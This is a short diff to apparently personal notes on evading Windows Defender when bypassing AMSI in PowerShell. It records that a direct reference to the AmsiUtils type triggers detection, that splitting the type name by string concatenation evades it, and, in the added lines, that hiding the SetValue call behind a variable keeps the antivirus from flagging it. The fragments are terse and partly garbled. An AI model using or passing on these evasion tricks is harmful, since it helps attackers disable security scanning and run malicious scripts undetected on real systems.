@@ -1,5 +1,8 @@
 > [Ref]. Assembly.GetType('System.Management.Automation.AmsiUtils') Gots catched by AV - Windows Event log 1116 and 1117  /Application and services Logs/Microsoft/Windows/Windows defender/ AMSI/Operational
 > [Ref]. Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils') Evades AV
 
+.SetValue($null,$true)  AV finds as malicious, so we set value
+> $Value="SetValue"
+> .SValue($null,$true)  #Now it works and AV is not notifyig about malicious content
 
 
